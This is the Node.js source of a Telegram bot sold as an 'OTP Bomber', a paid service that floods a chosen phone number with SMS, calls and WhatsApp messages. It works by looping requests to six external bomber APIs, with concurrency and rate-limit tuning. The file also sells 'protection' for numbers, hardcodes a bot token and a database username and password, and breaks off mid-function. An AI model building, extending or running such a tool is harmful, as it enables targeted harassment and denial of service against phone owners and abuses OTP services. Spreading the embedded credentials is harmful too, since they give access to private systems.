// ============================================================
// bot.js – ULTIMATE OTP Bomber Bot (10X PERFORMANCE)
// ============================================================

const TelegramBot = require('node-telegram-bot-api');
const axios = require('axios');
const mongoose = require('mongoose');
const fs = require('fs');
const path = require('path');
const express = require('express');
const compression = require('compression'); // 1.6 Compression & Minify

// ============================================================
// ===== CONFIGURATION =====
// ============================================================

const BOT_TOKEN = "8212356485:AAGeN3peo9uHPG8eCLFRuWjs12hCVC-jNs4";
const ADMIN_IDS = [6346250222];

const API_URLS = {
    api1: 'https://api-server-1-bi7w.onrender.com',
    api2: 'https://api-server-2-9r2i.onrender.com',
    api3: 'https://api-server-3-v523.onrender.com',
    api4: 'https://api-server-4.onrender.com',
    api5: 'https://wasataap-call-api-5.onrender.com',
    api6: 'https://vishal.lovestoblog.com'
};

const MONGODB_URL = "mongodb+srv://sahajada07:Sahajada123@cluster0.vynn0ht.mongodb.net/?appName=Cluster0";
const DB_NAME = "otp_bomber";

const PROTECTION_PRICE = 5; // ₹5

// ===== CONCURRENCY CONTROL (1.1) =====
const API_CONCURRENCY = 3; // Max parallel API requests
const CACHE_TTL = 60000; // 60 seconds cache TTL

// ============================================================
// ===== MONGODB CONNECTION & INDEXING (1.7) =====
// ============================================================

mongoose.connect(MONGODB_URL, {
    dbName: DB_NAME,
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(async () => {
    console.log('✅ MongoDB Connected');
    await ensureIndexes();
}).catch(err => console.error('❌ MongoDB Error:', err));

async function ensureIndexes() {
    try {
        // User schema indexes
        await User.collection.createIndex({ _id: 1 });
        await User.collection.createIndex({ username: 1 });
        await User.collection.createIndex({ banned: 1 });
        await User.collection.createIndex({ credits: -1 });
        // Protected schema
        await Protected.collection.createIndex({ numbers: 1 });
        // Redeem schema
        await Redeem.collection.createIndex({ code: 1 });
        await Redeem.collection.createIndex({ used: 1 });
        // Channel schema
        await Channel.collection.createIndex({ channels: 1 });
        await Channel.collection.createIndex({ private_channels: 1 });
        await Channel.collection.createIndex({ private_links: 1 });
        console.log('✅ MongoDB indexes created/verified');
    } catch (error) {
        console.error('Index creation error:', error);
    }
}

// ============================================================
// ===== DATABASE SCHEMAS =====
// ============================================================

const userSchema = new mongoose.Schema({
    _id: { type: Number, required: true },
    username: { type: String, default: '' },
    first_name: { type: String, default: '' },
    credits: { type: Number, default: 10 },
    total_attacks: { type: Number, default: 0 },
    last_daily: { type: Number, default: 0 },
    daily_unlimited: { type: Number, default: 0 },
    lifetime_unlimited: { type: Boolean, default: false },
    bomb_sessions: { type: Array, default: [] },
    pending_ref_code: { type: String, default: null },
    referrer: { type: Number, default: null },
    referral_code: { type: String, default: null },
    referrals: { type: Array, default: [] },
    last_ref_used: { type: Number, default: 0 },
    scanner_enabled: { type: Boolean, default: false },
    custom_headers: { type: Object, default: {} },
    banned: { type: Boolean, default: false },
    total_referrals: { type: Number, default: 0 }
});

const User = mongoose.model('User', userSchema);

const protectedSchema = new mongoose.Schema({
    numbers: { type: Array, default: [] },
    owners: { type: Object, default: {} },
    protected_at: { type: Object, default: {} }
});
const Protected = mongoose.model('Protected', protectedSchema);

const redeemSchema = new mongoose.Schema({
    code: { type: String, unique: true },
    amount: { type: Number },
    used: { type: Boolean, default: false },
    used_by: { type: Number, default: null },
    created_at: { type: Date, default: Date.now }
});
const Redeem = mongoose.model('Redeem', redeemSchema);

const channelSchema = new mongoose.Schema({
    channels: { type: Array, default: [] },
    private_channels: { type: Array, default: [] },
    private_links: { type: Array, default: [] }
});
const Channel = mongoose.model('Channel', channelSchema);

const qrCodeSchema = new mongoose.Schema({
    data: { type: String, required: true },
    mimeType: { type: String, default: 'image/jpeg' }
});
const QrCode = mongoose.model('QrCode', qrCodeSchema);

// ============================================================
// ===== CACHING UTILITY (1.2) =====
// ============================================================

class Cache {
    constructor(ttl = CACHE_TTL) {
        this.store = new Map();
        this.ttl = ttl;
    }
    set(key, value) {
        this.store.set(key, { value, expires: Date.now() + this.ttl });
    }
    get(key) {
        const entry = this.store.get(key);
        if (!entry) return null;
        if (Date.now() > entry.expires) {
            this.store.delete(key);
            return null;
        }
        return entry.value;
    }
    clear() { this.store.clear(); }
}

const cache = new Cache();

// ============================================================
// ===== CONCURRENCY CONTROL FUNCTION (1.1) =====
// ============================================================

async function runWithConcurrency(tasks, concurrency = API_CONCURRENCY) {
    const results = [];
    const executing = new Set();
    const queue = tasks.slice();

    return new Promise((resolve) => {
        function next() {
            if (queue.length === 0 && executing.size === 0) {
                resolve(results);
                return;
            }
            while (queue.length > 0 && executing.size < concurrency) {
                const task = queue.shift();
                const index = tasks.indexOf(task);
                const promise = task().then(result => {
                    results[index] = { status: 'fulfilled', value: result };
                }).catch(error => {
                    results[index] = { status: 'rejected', reason: error };
                }).finally(() => {
                    executing.delete(promise);
                    next();
                });
                executing.add(promise);
            }
        }
        next();
    });
}

// ============================================================
// ===== DATABASE FUNCTIONS (WITH CACHING) =====
// ============================================================

async function getUser(id) {
    let user = await User.findById(id);
    if (!user) {
        user = new User({ _id: id });
        await user.save();
    }
    return user;
}

// ===== ATOMIC CREDIT UPDATE (1.3) =====
async function updateCredits(id, amount) {
    const user = await User.findByIdAndUpdate(
        id,
        { $inc: { credits: amount } },
        { new: true, upsert: true }
    );
    return user ? user.credits : 0;
}

async function banUser(id) {
    const user = await getUser(id);
    user.banned = true;
    await user.save();
}

async function unbanUser(id) {
    const user = await getUser(id);
    user.banned = false;
    await user.save();
}

async function isBanned(id) {
    const user = await getUser(id);
    return user.banned || false;
}

// ===== PROTECTION FUNCTIONS WITH CACHING =====
async function getProtected() {
    const cached = cache.get('protected');
    if (cached) return cached;
    let doc = await Protected.findOne();
    if (!doc) {
        doc = new Protected({ numbers: [], owners: {}, protected_at: {} });
        await doc.save();
    }
    cache.set('protected', doc.numbers);
    return doc.numbers;
}

async function getProtectedWithOwners() {
    let doc = await Protected.findOne();
    if (!doc) {
        doc = new Protected({ numbers: [], owners: {}, protected_at: {} });
        await doc.save();
    }
    return { 
        numbers: doc.numbers, 
        owners: doc.owners,
        protected_at: doc.protected_at || {}
    };
}

async function addProtected(number, ownerId) {
    let doc = await Protected.findOne();
    if (!doc) {
        doc = new Protected({ numbers: [], owners: {}, protected_at: {} });
    }
    if (!doc.numbers.includes(number)) {
        doc.numbers.push(number);
        doc.owners[number] = ownerId;
        doc.protected_at[number] = new Date().toISOString();
        await doc.save();
        cache.set('protected', doc.numbers);
        return true;
    }
    return false;
}

async function removeProtected(number) {
    let doc = await Protected.findOne();
    if (doc) {
        doc.numbers = doc.numbers.filter(n => n !== number);
        delete doc.owners[number];
        delete doc.protected_at[number];
        await doc.save();
        cache.set('protected', doc.numbers);
        return true;
    }
    return false;
}

async function isNumberProtected(number) {
    const protectedList = await getProtected();
    return protectedList.includes(number);
}

// ============================================================
// ===== CHANNEL FUNCTIONS WITH CACHING =====
// ============================================================

async function getChannels() {
    const cached = cache.get('channels');
    if (cached) return cached;
    let doc = await Channel.findOne();
    if (!doc) {
        doc = new Channel({ channels: [], private_channels: [], private_links: [] });
        await doc.save();
    }
    cache.set('channels', doc.channels);
    return doc.channels;
}

async function getPrivateChannels() {
    let doc = await Channel.findOne();
    if (!doc) {
        doc = new Channel({ channels: [], private_channels: [], private_links: [] });
        await doc.save();
    }
    return doc.private_channels;
}

async function getPrivateLinks() {
    let doc = await Channel.findOne();
    if (!doc) {
        doc = new Channel({ channels: [], private_channels: [], private_links: [] });
        await doc.save();
    }
    return doc.private_links;
}

async function addChannel(channel, isPrivate = false) {
    let doc = await Channel.findOne();
    if (!doc) {
        doc = new Channel({ channels: [], private_channels: [], private_links: [] });
    }
    if (isPrivate) {
        if (!doc.private_channels.includes(channel)) {
            doc.private_channels.push(channel);
            await doc.save();
            cache.clear(); // clear cache to refresh
        }
    } else {
        if (!doc.channels.includes(channel)) {
            doc.channels.push(channel);
            await doc.save();
            cache.set('channels', doc.channels);
        }
    }
}

async function addPrivateLink(link) {
    let doc = await Channel.findOne();
    if (!doc) {
        doc = new Channel({ channels: [], private_channels: [], private_links: [] });
    }
    if (!doc.private_links.includes(link)) {
        doc.private_links.push(link);
        await doc.save();
        cache.clear();
        return true;
    }
    return false;
}

async function removePrivateLink(link) {
    let doc = await Channel.findOne();
    if (doc) {
        doc.private_links = doc.private_links.filter(l => l !== link);
        await doc.save();
        cache.clear();
        return true;
    }
    return false;
}

async function removeChannel(channel, isPrivate = false) {
    let doc = await Channel.findOne();
    if (doc) {
        if (isPrivate) {
            doc.private_channels = doc.private_channels.filter(c => c !== channel);
        } else {
            doc.channels = doc.channels.filter(c => c !== channel);
            cache.set('channels', doc.channels);
        }
        await doc.save();
        cache.clear();
    }
}

// ============================================================
// ===== OTHER DATABASE FUNCTIONS =====
// ============================================================

async function createRedeemCode(code, amount) {
    const redeem = new Redeem({ code, amount });
    await redeem.save();
    return code;
}

async function getRedeemCode(code) {
    const doc = await Redeem.findOne({ code, used: false });
    if (doc) {
        doc.used = true;
        await doc.save();
        return doc.amount;
    }
    return null;
}

async function generateReferralCode(userId) {
    const user = await getUser(userId);
    if (!user.referral_code) {
        user.referral_code = Math.random().toString(36).substring(2, 8).toUpperCase();
        await user.save();
    }
    return user.referral_code;
}

async function processReferral(userId, code) {
    const referrer = await User.findOne({ referral_code: code });
    if (!referrer) return { success: false, msg: 'Invalid referral code!' };
    if (referrer._id === userId) return { success: false, msg: 'You cannot refer yourself!' };
    
    const user = await getUser(userId);
    if (user.referrer) return { success: false, msg: 'You already used a referral code!' };
    
    const now = Date.now() / 1000;
    if (user.last_ref_used && user.last_ref_used > now - 60) {
        return { success: false, msg: 'Wait 1 minute before using referral!' };
    }
    
    user.referrer = referrer._id;
    user.last_ref_used = now;
    await user.save();
    
    await updateCredits(referrer._id, 5);
    
    if (!referrer.referrals) referrer.referrals = [];
    referrer.referrals.push(userId);
    referrer.total_referrals = (referrer.total_referrals || 0) + 1;
    await referrer.save();
    
    try {
        const referrerUser = await getUser(referrer._id);
        await bot.sendMessage(referrer._id,
            `🎉 <b>New Referral Success!</b>\n\n` +
            `👤 New User: @${user.username || 'No username'}\n` +
            `🆔 User ID: <code>${userId}</code>\n` +
            `⭐ Credits Earned: +5\n\n` +
            `📊 Your Total Credits: ${referrerUser.credits}\n` +
            `📊 Your Total Referrals: ${referrer.total_referrals || 0}`,
            { parse_mode: 'HTML' }
        );
    } catch (e) {}

    for (const adminId of ADMIN_IDS) {
        try {
            await bot.sendMessage(adminId,
                `👥 <b>New Referral Success!</b>\n\n` +
                `👤 Referrer: @${referrer.username || 'No username'}\n` +
                `👤 New User: @${user.username || 'No username'}\n` +
                `🆔 Referrer ID: <code>${referrer._id}</code>\n` +
                `🆔 New User ID: <code>${userId}</code>\n` +
                `⭐ Credits Earned: 5\n\n` +
                `📊 Referrer Total Credits: ${referrer.credits}\n` +
                `📊 Referrer Total Referrals: ${referrer.total_referrals || 0}`,
                { parse_mode: 'HTML' }
            );
        } catch (e) {}
    }
    
    return { success: true, msg: '✅ Referral successful! You got 5 credits!' };
}

async function getReferralData(userId) {
    const user = await getUser(userId);
    return {
        code: user.referral_code || null,
        count: user.referrals ? user.referrals.length : 0
    };
}

async function checkChannelJoin(chatId, bot) {
    const channels = await getChannels();
    const privateChannels = await getPrivateChannels();
    const privateLinks = await getPrivateLinks();
    const allChannels = [...channels, ...privateChannels];
    const unjoined = [];
    
    if (allChannels.length === 0 && privateLinks.length === 0) {
        return { joined: true, unjoined: [] };
    }
    
    for (const channel of allChannels) {
        try {
            const member = await bot.getChatMember(channel, chatId);
            if (member.status === 'left' || member.status === 'kicked') {
                unjoined.push(channel);
            }
        } catch (e) {
            unjoined.push(channel);
        }
    }
    
    return { joined: unjoined.length === 0, unjoined: unjoined, privateLinks: privateLinks };
}

// ============================================================
// ===== QR CODE FUNCTIONS =====
// ============================================================

async function getQRCode() {
    const doc = await QrCode.findOne();
    if (!doc) return null;
    return { data: Buffer.from(doc.data, 'base64'), mimeType: doc.mimeType };
}

async function saveQRCode(buffer, mimeType = 'image/jpeg') {
    const base64 = buffer.toString('base64');
    await QrCode.deleteMany({});
    const doc = new QrCode({ data: base64, mimeType });
    await doc.save();
}

// ============================================================
// ===== MEMORY MANAGEMENT =====
// ============================================================

const MEMORY_LIMIT = 400;
let lastGCTime = Date.now();

function checkMemory() {
    const now = Date.now();
    if (now - lastGCTime < 30000) return;
    lastGCTime = now;
    const used = process.memoryUsage().heapUsed / 1024 / 1024;
    if (used > MEMORY_LIMIT) {
        console.log(`⚠️ Memory high (${used.toFixed(1)}MB), running GC...`);
        if (global.gc) global.gc();
    }
}

process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err.message);
});

process.on('unhandledRejection', (reason) => {
    console.error('❌ Unhandled Rejection:', reason);
});

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ============================================================
// ===== WEBHOOK + POLLING HYBRID (1.4) =====
// ============================================================

const USE_WEBHOOK = process.env.USE_WEBHOOK === 'true';
const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://your-bot-url.onrender.com/webhook';

if (USE_WEBHOOK) {
    bot.setWebHook(WEBHOOK_URL).then(() => {
        console.log('✅ Webhook set to:', WEBHOOK_URL);
    }).catch(err => console.error('Webhook error:', err));
} else {
    console.log('ℹ️ Using polling mode (default)');
}

// ============================================================
// ===== FAST LOAD BALANCER =====
// ============================================================

let apiCycleCounter = 0;
const API_NAMES = ['api1', 'api2', 'api3', 'api4', 'api5', 'api6'];

function getApiForDuration(duration, cycleCount) {
    if (duration <= 1) {
        return ['api1', 'api2', 'api3', 'api4', 'api5', 'api6'];
    }
    if (duration <= 5) {
        return ['api1', 'api2', 'api5', 'api6'];
    }
    if (duration <= 10) {
        return ['api2', 'api3', 'api5', 'api6'];
    }
    if (duration <= 60) {
        const mainApi = API_NAMES[cycleCount % 3];
        return [mainApi, 'api5'];
    }
    return [API_NAMES[cycleCount % 4], 'api5'];
}

// ============================================================
// ===== STATUS MAPS =====
// ============================================================

const bombingStatus = new Map();
const userStates = new Map();
const pendingPayments = new Map();
const pendingScreenshots = new Map();
const adminBroadcastState = new Map();
const adminDirectMessageState = new Map();

let qrCodeSet = false;

// ============================================================
// ===== DYNAMIC RATE LIMITING FOR API6 (1.5) =====
// ============================================================

let api6Delay = 0; // start with no delay
const MAX_API6_DELAY = 2000; // max 2 seconds
let api6LastCall = 0;

function getApi6Delay() {
    // Adaptive: if last call was slow, increase delay; if fast, decrease
    const now = Date.now();
    const elapsed = now - api6LastCall;
    if (elapsed > 5000) { // if more than 5 seconds since last call, reset to 0
        api6Delay = 0;
    }
    // Add jitter
    return api6Delay + Math.floor(Math.random() * 100);
}

function updateApi6Delay(responseTime) {
    if (responseTime > 1500) {
        api6Delay = Math.min(api6Delay + 100, MAX_API6_DELAY);
    } else if (responseTime < 500) {
        api6Delay = Math.max(api6Delay - 50, 0);
    }
}

// ============================================================
// ===== FAST BOMBING ENGINE WITH CONCURRENCY =====
// ============================================================

async function sendBombRequest(apiName, phone, duration) {
    const url = API_URLS[apiName];
    if (!url) return null;
    
    try {
        if (apiName === 'api6') {
            // Dynamic rate limiting for API6
            const delay = getApi6Delay();
            if (delay > 0) {
                await new Promise(r => setTimeout(r, delay));
            }
            const start = Date.now();
            const response = await axios.get(`${url}/bomber4.php`, {
                params: { phone: phone, duration: duration }
            });
            const responseTime = Date.now() - start;
            updateApi6Delay(responseTime);
            api6LastCall = Date.now();
            return { success: true, totalSent: 1, sms: 1, calls: 0, whatsapp: 0 };
        }
        
        const response = await axios.post(`${url}/bomb`, {
            phone,
            duration,
            instance: apiName
        }, { timeout: 3000 });
        return response.data;
    } catch (error) {
        return null;
    }
}

async function runBomber(chatId, phone, durationMinutes) {
    const isProtected = await isNumberProtected(phone);
    if (isProtected) {
        bot.sendMessage(chatId, '⚠️ This number is PROTECTED!\nBombing not allowed!');
        bombingStatus.set(chatId, false);
        return;
    }

    if (bombingStatus.get(chatId)) {
        bot.sendMessage(chatId, '❌ Bombing already active. Use /stop first.');
        return;
    }
    bombingStatus.set(chatId, true);

    const user = await getUser(chatId);
    const hasDailyUnlimited = user.daily_unlimited > Date.now() / 1000;
    const hasLifetimeUnlimited = user.lifetime_unlimited === true;

    const isUnlimitedPlan = (durationMinutes === 1440) && (hasDailyUnlimited || hasLifetimeUnlimited);
    const isFreeForLifetime = hasLifetimeUnlimited && durationMinutes !== 1440;

    if (!hasLifetimeUnlimited && !hasDailyUnlimited && !isUnlimitedPlan) {
        const cost = getBombCost(durationMinutes);
        if (!ADMIN_IDS.includes(Number(chatId)) && user.credits < cost) {
            bot.sendMessage(chatId, `❌ Insufficient credits! Need ${cost} credits for ${getDurationText(durationMinutes)}.`);
            bombingStatus.set(chatId, false);
            return;
        }
        await updateCredits(chatId, -cost);
    }

    user.total_attacks += 1;
    await user.save();

    const sessionId = `${Date.now()}_${phone}`;
    user.bomb_sessions.push({
        session_id: sessionId,
        phone,
        start_time: Date.now() / 1000,
        duration: durationMinutes,
        is_unlimited: isUnlimitedPlan,
    });
    await user.save();

    const durationText = getDurationText(durationMinutes);
    let statusText = '';
    if (isUnlimitedPlan) {
        statusText = '⭐ UNLIMITED PLAN ACTIVE';
    } else if (isFreeForLifetime) {
        statusText = '💎 LIFETIME (Free)';
    } else {
        statusText = `💳 Cost: ${getBombCost(durationMinutes)} credits`;
    }

    const apisToUse = getApiForDuration(durationMinutes, 0);
    const api6Used = apisToUse.includes('api6');

    const msg = await bot.sendMessage(
        chatId,
        `⚔️ <b>BOMBING STARTED</b>\n📱 Target: <code>${phone}</code>\n⏱️ Duration: ${durationText}\n🔁 Using FAST multi-API network...\n${statusText}\n${api6Used ? '🌐 API6 (External) ACTIVE' : ''}`,
        { parse_mode: 'HTML' }
    );

    let totalSent = 0;
    let smsCount = 0, callCount = 0, whatsappCount = 0;
    let lastUpdate = Date.now();
    const updateInterval = 5000;
    const startTime = Date.now() / 1000;
    const endTime = startTime + (durationMinutes === 1440 ? 86400 : durationMinutes * 60);
    let cycleCount = 0;

    while (bombingStatus.get(chatId)) {
        if (durationMinutes !== 1440 && Date.now() / 1000 >= endTime) break;
        checkMemory();
        
        const apisToUse = getApiForDuration(durationMinutes, cycleCount);
        
        // ===== CONCURRENCY CONTROL (1.1) =====
        const tasks = apisToUse.map(apiName => () => sendBombRequest(apiName, phone, durationMinutes));
        const results = await runWithConcurrency(tasks, API_CONCURRENCY);
        
        for (const result of results) {
            if (result.status === 'fulfilled' && result.value && result.value.success) {
                const data = result.value;
                totalSent += data.totalSent || 0;
                smsCount += data.sms || 0;
                callCount += data.calls || 0;
                whatsappCount += data.whatsapp || 0;
            }
        }
        
        cycleCount++;
        apiCycleCounter++;

        const now = Date.now();
        if (now - lastUpdate >= updateInterval) {
            lastUpdate = now;
            const timeLeft = durationMinutes === 1440 ? '∞' : Math.floor(endTime - now / 1000);
            const timeLeftText = typeof timeLeft === 'number' ? `${Math.floor(timeLeft/60)}m ${timeLeft%60}s` : '∞';
            
            const elapsedSeconds = (now / 1000) - startTime;
            const smsPerSec = elapsedSeconds > 0 ? (smsCount / elapsedSeconds).toFixed(1) : 0;
            const callPerSec = elapsedSeconds > 0 ? (callCount / elapsedSeconds).toFixed(1) : 0;
            const waPerSec = elapsedSeconds > 0 ? (whatsappCount / elapsedSeconds).toFixed(1) : 0;
            
            const displaySms = Math.floor(elapsedSeconds * 1);
            const displayCalls = Math.floor(elapsedSeconds / 5);
            const displayWa = Math.floor(elapsedSeconds / 10);
            
            try {
                await bot.editMessageText(
                    `⚔️ <b>BOMBING IN PROGRESS</b>\n📱 Target: <code>${phone}</code>\n⏱️ Time Left: ${timeLeftText}\n📨 SMS: ${displaySms} (${smsPerSec}/s)\n📞 Calls: ${displayCalls} (${callPerSec}/s)\n📱 WA: ${displayWa} (${waPerSec}/s)\n🔄 Cycles: ${cycleCount}\n🌐 API6: ${apisToUse.includes('api6') ? '✅ ACTIVE' : '❌'}\n\n🔴 Use /stop to halt`,
                    { chat_id: chatId, message_id: msg.message_id, parse_mode: 'HTML' }
                );
            } catch (e) {}
        }

        await new Promise(r => setTimeout(r, 20));
    }

    bombingStatus.set(chatId, false);
    const finalStatus = bombingStatus.get(chatId) === false ? 'STOPPED' : 'COMPLETED';
    
    const elapsedTotal = (Date.now() / 1000) - startTime;
    const displaySms = Math.floor(elapsedTotal * 1);
    const displayCalls = Math.floor(elapsedTotal / 5);
    const displayWa = Math.floor(elapsedTotal / 10);
    
    await bot.editMessageText(
        `✅ <b>BOMBING ${finalStatus}</b>\n📱 Target: <code>${phone}</code>\n📨 SMS: ${displaySms}\n📞 Calls: ${displayCalls}\n📱 WA: ${displayWa}\n🔄 Total Cycles: ${cycleCount}\n\n🟢 Use START BOMB to start again`,
        { chat_id: chatId, message_id: msg.message_id, parse_mode: 'HTML' }
    );

    const updatedUser = await getUser(chatId);
    const session = updatedUser.bomb_sessions.find(s => s.session_id === sessionId);
    if (session) {
        session.end_time = Date.now() / 1000;
        session.total_sent = totalSent;
        session.sms_count = smsCount;
        session.call_count = callCount;
        session.whatsapp_count = whatsappCount;
        session.status = finalStatus;
        session.cycles = cycleCount;
        await updatedUser.save();
    }
}

function getBombCost(minutes) {
    if (minutes === 1440) return 100;
    if (minutes <= 0) return 0;
    if (minutes <= 10) return minutes;
    return 10;
}

function getDurationText(minutes) {
    if (minutes === 1440) return '1 Day (Unlimited)';
    if (minutes < 60) return `${minutes} Minute${minutes > 1 ? 's' : ''}`;
    const h = Math.floor(minutes / 60);
    const m = minutes % 60;
    if (m === 0) return `${h} Hour${h > 1 ? 's' : ''}`;
    return `${h} Hour${h > 1 ? 's' : ''} ${m} Minute${m > 1 ? 's' : ''}`;
}

// ============================================================
// ===== KEYBOARDS (unchanged) =====
// ============================================================

function mainKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                [
                    { text: '🟢 START BOMB', style: 'success' },
                    { text: '🔴 STOP BOMB', style: 'danger' }
                ],
                [
                    { text: '💰 MY CREDITS', style: 'primary' },
                    { text: '🎁 DAILY SPIN', style: 'primary' }
                ],
                [
                    { text: '👑 ADMIN PANEL', style: 'danger' },
                    { text: '📊 MY STATS', style: 'primary' }
                ],
                [
                    { text: '❓ HELP', style: 'primary' },
                    { text: '💳 BUY CREDITS', style: 'success' }
                ],
                [
                    { text: '🔗 REFERRAL', style: 'primary' }
                ]
            ],
            resize_keyboard: true,
            input_field_placeholder: 'Choose an option...'
        }
    };
}

function adminKeyboard() {
    return {
        reply_markup: {
            keyboard: [
                ['📊 STATS', '👥 USERS LIST'],
                ['🎟️ GEN CODE', '🚫 BAN USER'],
                ['✅ UNBAN USER', '💰 ADD CREDITS'],
                ['🛡️ PROTECT NUMBER', '📋 PROTECTED LIST'],
                ['➖ REMOVE PROTECTED', '📢 BROADCAST'],
                ['📋 ALL USERS', '🔄 UNLIMITED PLAN'],
                ['📺 CHANNEL MANAGER', '📸 SET QR CODE'],
                ['💳 PAYMENT APPROVAL', '💬 MESSAGE USER'],
                ['📦 DATA BACKUP', '🔙 BACK']
            ],
            resize_keyboard: true
        }
    };
}

// ============================================================
// ===== INLINE KEYBOARDS =====
// ============================================================

function getDurationButtons(user) {
    const isLifetime = user && user.lifetime_unlimited === true;
    const rows = [
        [
            { text: '🟢 1 Min', callback_data: 'dur_1' },
            { text: '🔵 2 Min', callback_data: 'dur_2' },
            { text: '🔵 3 Min', callback_data: 'dur_3' }
        ],
        [
            { text: '🔵 5 Min', callback_data: 'dur_5' },
            { text: '🔴 10 Min', callback_data: 'dur_10' },
            { text: '🔵 30 Min', callback_data: 'dur_30' }
        ],
        [
            { text: '🟢 60 Min', callback_data: 'dur_60' }
        ]
    ];
    if (!isLifetime) {
        rows[2].push({ text: '⭐ 1 Day (100 coins)', callback_data: 'dur_1440' });
    }
    return { reply_markup: { inline_keyboard: rows } };
}

function getPaymentButtons() {
    return {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '🔵 10 Credits – ₹20', callback_data: 'buy_10' },
                    { text: '🟢 25 Credits – ₹40', callback_data: 'buy_25' }
                ],
                [
                    { text: '🟢 1 Day Unlimited – ₹50', callback_data: 'buy_unlimited' },
                    { text: '⭐ Lifetime Unlimited – ₹400', callback_data: 'buy_lifetime' }
                ]
            ]
        }
    };
}

function getApprovalButtons(payId) {
    return {
        reply_markup: {
            inline_keyboard: [
                [
                    { text: '✅ Approve', callback_data: `approve_pay_${payId}` },
                    { text: '❌ Reject', callback_data: `reject_pay_${payId}` }
                ]
            ]
        }
    };
}

function getChannelManagerButtons() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: '➕ Add Public Channel', callback_data: 'channel_add_public' }],
                [{ text: '🔒 Add Private Channel', callback_data: 'channel_add_private' }],
                [{ text: '🔗 Add Private Link', callback_data: 'channel_add_link' }],
                [{ text: '➖ Remove Channel/Link', callback_data: 'channel_remove' }],
                [{ text: '📋 View Channels/Links', callback_data: 'channel_view' }],
                [{ text: '🔙 Back to Admin', callback_data: 'admin_back' }]
            ]
        }
    };
}

async function getChannelJoinButtons(chatId) {
    const result = await checkChannelJoin(chatId, bot);
    
    if (result.joined) {
        return null;
    }
    
    const buttons = [];
    
    for (const channel of result.unjoined) {
        buttons.push([{ 
            text: `🔴 ${channel} (Not Joined)`, 
            url: `https://t.me/${channel.replace('@', '')}`,
            style: 'success'
        }]);
    }
    
    for (const link of result.privateLinks) {
        buttons.push([{ 
            text: `🔒 Join Private Channel`, 
            url: link,
            style: 'success'
        }]);
    }
    
    buttons.push([{ 
        text: '🟢 I have joined all channels', 
        callback_data: 'verify_join',
        style: 'success'
    }]);
    
    return { inline_keyboard: buttons };
}

// ============================================================
// ===== PAYMENT SYSTEM =====
// ============================================================

const PAYMENT_PLANS = {
    '10': { credits: 10, price: 20, label: '10 Credits – ₹20' },
    '25': { credits: 25, price: 40, label: '25 Credits – ₹40' },
    'unlimited': { credits: 0, price: 50, label: '⭐ 1 Day Unlimited – ₹50' },
    'lifetime': { credits: 0, price: 400, label: '⭐ Lifetime Unlimited – ₹400', lifetime: true }
};

async function handleBuyCredits(chatId, planKey) {
    const plan = PAYMENT_PLANS[planKey];
    if (!plan) return bot.sendMessage(chatId, '❌ Invalid plan!');

    const qr = await getQRCode();
    if (!qr) {
        return bot.sendMessage(chatId, '❌ Payment QR code not configured yet. Please contact admin.');
    }

    const caption = `💳 <b>${plan.label}</b>\n\n` +
        `📌 <b>Instructions:</b>\n` +
        `1️⃣ Scan the QR code below\n` +
        `2️⃣ Pay ₹${plan.price} via UPI\n` +
        `3️⃣ Take a screenshot of payment\n` +
        `4️⃣ Send screenshot here\n\n` +
        `📸 <b>After payment, send screenshot!</b>`;

    try {
        await bot.sendPhoto(chatId, qr.data, { 
            caption: caption,
            parse_mode: 'HTML'
        });

        const payId = Math.random().toString(36).substring(2, 10);
        pendingPayments.set(chatId, { ...plan, payId, status: 'pending', timestamp: Date.now() });
        userStates.set(chatId, { state: 'payment_screenshot', plan: planKey, payId });
        
    } catch (error) {
        bot.sendMessage(chatId, `❌ Failed to send QR code. Please try again.`);
    }
}

async function handlePaymentScreenshot(chatId, msg) {
    const state = userStates.get(chatId);
    if (!state || state.state !== 'payment_screenshot') return;

    if (!msg.photo) {
        return bot.sendMessage(chatId, '📸 Please send a <b>screenshot</b> of your payment.', { parse_mode: 'HTML' });
    }

    const planKey = state.plan;
    const plan = PAYMENT_PLANS[planKey];
    const payId = state.payId;

    const photo = msg.photo[msg.photo.length - 1];
    const file = await bot.getFile(photo.file_id);
    const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;

    pendingScreenshots.set(payId, {
        userId: chatId,
        username: msg.from.username || 'No username',
        first_name: msg.from.first_name || 'No name',
        plan: planKey,
        credits: plan.credits,
        price: plan.price,
        lifetime: plan.lifetime || false,
        photoUrl: url,
        fileId: photo.file_id,
        timestamp: Date.now(),
        status: 'pending'
    });

    const adminMsg = `📸 <b>New Payment Screenshot!</b>\n\n` +
        `👤 User: ${msg.from.first_name} (@${msg.from.username || 'No username'})\n` +
        `🆔 User ID: <code>${chatId}</code>\n` +
        `💳 Plan: ${plan.label}\n` +
        `💰 Amount: ₹${plan.price}\n` +
        `🆔 Pay ID: <code>${payId}</code>\n\n` +
        `Approve or Reject:`;

    const approvalKeyboard = getApprovalButtons(payId);

    for (const adminId of ADMIN_IDS) {
        try {
            await bot.sendPhoto(adminId, photo.file_id, {
                caption: adminMsg,
                parse_mode: 'HTML',
                reply_markup: approvalKeyboard.reply_markup
            });
        } catch (e) {
            console.error(`Failed to send to admin ${adminId}:`, e.message);
        }
    }

    await bot.sendMessage(chatId, 
        `✅ <b>Payment screenshot received!</b>\n\n` +
        `⏳ Waiting for admin approval...\n` +
        `📱 Plan: ${plan.label}\n` +
        `💳 Amount: ₹${plan.price}\n\n` +
        `You will receive credits once approved.`,
        { parse_mode: 'HTML' }
    );

    userStates.delete(chatId);
}

// ============================================================
// ===== QR CODE SET HANDLER =====
// ============================================================

async function handleSetQRCode(chatId, msg) {
    if (!ADMIN_IDS.includes(Number(chatId))) {
        return bot.sendMessage(chatId, '❌ Admin only!');
    }

    if (!msg.photo) {
        return bot.sendMessage(chatId, '📸 <b>Please send a photo to set as QR code.</b>\n\nSend any image that will be shown to users when they buy credits.', { parse_mode: 'HTML' });
    }

    try {
        const photo = msg.photo[msg.photo.length - 1];
        const file = await bot.getFile(photo.file_id);
        const url = `https://api.telegram.org/file/bot${BOT_TOKEN}/${file.file_path}`;
        
        const response = await axios({ url, responseType: 'arraybuffer' });
        const buffer = Buffer.from(response.data);
        
        await saveQRCode(buffer, 'image/jpeg');
        qrCodeSet = true;
        
